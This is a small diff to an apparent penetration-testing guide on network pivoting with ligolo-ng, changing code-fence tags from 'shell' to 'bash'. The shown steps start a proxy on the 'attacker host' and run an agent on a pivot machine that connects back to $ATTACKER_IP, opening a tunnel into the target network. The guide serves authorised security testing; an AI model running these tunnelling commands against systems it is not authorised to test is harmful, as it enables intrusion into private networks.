@@ -26,11 +26,11 @@ Several tools can provide this operator experience, but they rely on different m
 > - Root privileges are required to create a `tun` interface on the attacker host.
 
 1. Start the proxy (attacker side)
-```shell
+```bash
 sudo ligolo-proxy -selfcert
 ```
 2. Start the agent (pivot side)
-```shell
+```bash
 ligolo-agent -accept-fingerprint "$CERTIFICATE_FINGERPRINT" -connect "$ATTACKER_IP:$PROXY_PORT"
 ```
 3. After the agent has joined, select the session with `session` in the proxy CLI.
